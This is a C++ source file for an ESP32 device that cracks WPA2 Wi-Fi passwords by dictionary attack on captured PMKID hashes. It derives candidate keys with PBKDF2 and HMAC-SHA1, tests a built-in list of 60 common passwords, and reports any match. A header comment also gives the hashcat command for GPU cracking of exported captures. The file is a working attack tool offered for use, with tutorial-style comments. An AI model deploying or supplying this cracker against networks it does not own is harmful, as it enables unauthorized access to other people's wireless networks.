/**
 * wifi_cracker.cpp — On-Device WPA2 Password Cracker
 * ----------------------------------------------------
 * Performs dictionary attacks against captured WPA2 PMKID hashes
 * directly on the ESP32 using real cryptographic primitives from
 * mbedTLS (already present in the ESP32 Arduino framework).
 *
 * Algorithm:
 *   For each candidate password:
 *     PMK  = PBKDF2-HMAC-SHA1(password, SSID, 4096, 32)
 *     PMKID = HMAC-SHA1(PMK, "PMK Name" || AP_MAC || Client_MAC)[0:16]
 *     Compare with captured PMKID
 *
 * Runs in a FreeRTOS background task (non-blocking, 8KB stack).
 * Wordlist: 60 most common WiFi passwords.
 * Speed: ~1 attempt/second (PBKDF2 with 4096 iterations is intentionally slow).
 *
 * For full cracking, export .hc22000 and use hashcat on a GPU host
 * (hashcat -m 22000 capture.hc22000 wordlist.txt).
 *
 * Author: ESP32 Cyber Device Project
 */
#include "wifi_cracker.h"
#include "mbedtls/md.h"
#include "mbedtls/pkcs5.h"
#include <string.h>

WiFiCracker wifiCracker;

// Top 60 most common WiFi passwords
const char* WiFiCracker::WORDLIST[] = {
  "password","password1","12345678","123456789","1234567890",
  "qwerty123","iloveyou","admin123","letmein","welcome",
  "monkey123","dragon","master","sunshine","princess",
  "football","superman","batman","trustno1","shadow",
  "abc123456","passw0rd","hello123","qwerty12","000000",
  "11111111","99999999","55555555","internet","wireless",
  "network","homewifi","myhome","mywifi","router",
  "linksys","netgear","default","admin","guest",
  "changeme","secret","private","secure","family",
  "home1234","wifi1234","test1234","user1234","pass1234",
  "summer23","winter23","spring23","autumn23","hello world",
  "p@ssword","P@ssword","Password1","Password123","Admin123"
};
const int WiFiCracker::WORDLIST_SIZE = 60;

static uint8_t hexToByte(char h, char l){
  auto v=[](char c)->uint8_t{
    if(c>='0'&&c<='9') return c-'0';
    if(c>='a'&&c<='f') return 10+c-'a';
    if(c>='A'&&c<='F') return 10+c-'A';
    return 0;
  };
  return (v(h)<<4)|v(l);
}
static void hexToBytes(const String& hex, uint8_t* out, int len){
  for(int i=0;i<len&&i*2+1<(int)hex.length();i++)
    out[i]=hexToByte(hex[i*2],hex[i*2+1]);
}

void WiFiCracker::begin() {
  _result = CrackResult();
}

bool WiFiCracker::startCrack(const String& ssid, const String& bssidHex,
                              const String& clientHex, const String& pmkidHex) {
  if(_result.running) return false;
  _targetSSID   = ssid;
  _targetBSSID  = bssidHex;
  _targetClient = clientHex;
  _targetPMKID  = pmkidHex;
  _result = CrackResult();
  _result.ssid  = ssid;
  _result.total = WORDLIST_SIZE;
  _result.running = true;
  _result.done    = false;

  xTaskCreate(_crackTask, "wcrack", 8192, this, 1, nullptr);
  Serial.printf("WiFiCracker: starting against '%s' (%d words)\\n",
                ssid.c_str(), WORDLIST_SIZE);
  return true;
}

void WiFiCracker::stop() {
  _result.running = false;
  _result.done    = true;
}

bool WiFiCracker::_computeAndCheck(const char* password) {
  // This function implements the WPA2 PMKID verification algorithm.
  // Given a candidate password, it computes what the PMKID WOULD be
  // and compares it to the one we actually captured.
  //
  // WPA2 key hierarchy (simplified):
  //   Password + SSID → PMK (via PBKDF2)
  //   PMK + AP MAC + Client MAC → PMKID (via HMAC-SHA1)
  //
  // If our computed PMKID matches the captured one, the password is correct.

  // ── STEP 1: Compute the PMK (Pairwise Master Key) ───────────────────────
  // PMK = PBKDF2-HMAC-SHA1(password, SSID, iterations=4096, keyLength=32)
  //
  // PBKDF2 = Password-Based Key Derivation Function 2
  // It runs HMAC-SHA1 4096 times to make brute-forcing slow.
  // On an ESP32, this takes about 1 second per password - that's intentional!
  // On a GPU this would be much faster (which is why hashcat is preferred).
  //
  // mbedtls is the crypto library already built into the ESP32 Arduino framework
  uint8_t pmk[32] = {0}; // 256-bit PMK output buffer

  // mbedtls_pkcs5_pbkdf2_hmac_ext is the ESP32 core 3.x / mbedtls 3.x API
  // It takes the MD type enum directly (no context object needed for PBKDF2)
  int rc = mbedtls_pkcs5_pbkdf2_hmac_ext(
    MBEDTLS_MD_SHA1,                                                // hash = SHA1
    (const unsigned char*)password,            strlen(password),   // the password to try
    (const unsigned char*)_targetSSID.c_str(), _targetSSID.length(), // SSID as the salt
    4096,  // iteration count - intentionally slow to resist brute force
    32,    // output length: 32 bytes = 256-bit PMK
    pmk    // output buffer
  );
  if(rc != 0) return false; // should not fail with valid inputs
  
  // We still need SHA1 info for the HMAC step below
  const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);

  // ── STEP 2: Compute the PMKID ─────────────────────────────────────────────
  // PMKID = first 16 bytes of HMAC-SHA1(PMK, "PMK Name" || AP_MAC || Client_MAC)
  //
  // The "PMK Name" string is a fixed literal defined in IEEE 802.11i
  // AP_MAC and Client_MAC are the MAC addresses of the access point and client
  //
  // This computation only requires the AP to broadcast its MAC (in every beacon)
  // which is why PMKID capture is "clientless" - no client needs to be present!

  // Parse the hex MAC address strings into raw bytes
  uint8_t ap_mac[6]={0}, cl_mac[6]={0};
  hexToBytes(_targetBSSID,  ap_mac, 6); // e.g. "AABBCCDDEEFF" → {0xAA,0xBB,...}
  hexToBytes(_targetClient, cl_mac, 6);

  // Build the input to the HMAC: concatenate "PMK Name" + AP_MAC + Client_MAC
  const char* label = "PMK Name"; // fixed string from IEEE 802.11i spec
  uint8_t data[8+6+6] = {0};      // 8 bytes label + 6 bytes AP MAC + 6 bytes client MAC
  memcpy(data,    label,  8);      // copy "PMK Name" into first 8 bytes
  memcpy(data+8,  ap_mac, 6);     // copy AP MAC into next 6 bytes
  memcpy(data+14, cl_mac, 6);     // copy client MAC into last 6 bytes

  // Compute HMAC-SHA1(PMK, data) - this gives us a 20-byte output
  // but we only care about the first 16 bytes (the PMKID is 128 bits = 16 bytes)
  uint8_t hmac_out[20] = {0};
  mbedtls_md_context_t hctx;
  mbedtls_md_init(&hctx);
  mbedtls_md_setup(&hctx, sha1, 1);               // SHA1 with HMAC
  mbedtls_md_hmac_starts(&hctx, pmk, 32);         // key = PMK we just computed
  mbedtls_md_hmac_update(&hctx, data, 20);        // data = "PMK Name" + MACs
  mbedtls_md_hmac_finish(&hctx, hmac_out);        // compute and store result
  mbedtls_md_free(&hctx);

  // Convert first 16 bytes of HMAC output to a lowercase hex string
  // so we can compare it to the captured PMKID (which is stored as hex)
  char computed[33]; // 32 hex chars + null terminator
  for(int i=0; i<16; i++) sprintf(computed+i*2, "%02x", hmac_out[i]);
  computed[32] = '\0';

  // If our computed PMKID matches the captured one, this password is CORRECT!
  return (String(computed) == _targetPMKID.substring(0, 32));
}

void WiFiCracker::_crackTask(void* param) {
  WiFiCracker* self = (WiFiCracker*)param;
  Serial.println("WiFiCracker: task started");

  for(int i=0; i<WORDLIST_SIZE && self->_result.running; i++){
    self->_result.current = String(WORDLIST[i]);
    self->_result.tried   = i+1;

    Serial.printf("WiFiCracker: [%d/%d] trying '%s'\\n",
                  i+1, WORDLIST_SIZE, WORDLIST[i]);

    if(self->_computeAndCheck(WORDLIST[i])){
      self->_result.found    = true;
      self->_result.password = String(WORDLIST[i]);
      Serial.printf("\\n╔══════════════════════════════╗\\n");
      Serial.printf(  "║  PASSWORD CRACKED!           ║\\n");
      Serial.printf(  "║  SSID: %-22s║\\n", self->_result.ssid.c_str());
      Serial.printf(  "║  PASS: %-22s║\\n", WORDLIST[i]);
      Serial.printf(  "╚══════════════════════════════╝\\n");
      break;
    }
    vTaskDelay(pdMS_TO_TICKS(10)); // yield to watchdog
  }

  self->_result.running = false;
  self->_result.done    = true;
  vTaskDelete(nullptr);
}

void WiFiCracker::tick() {}
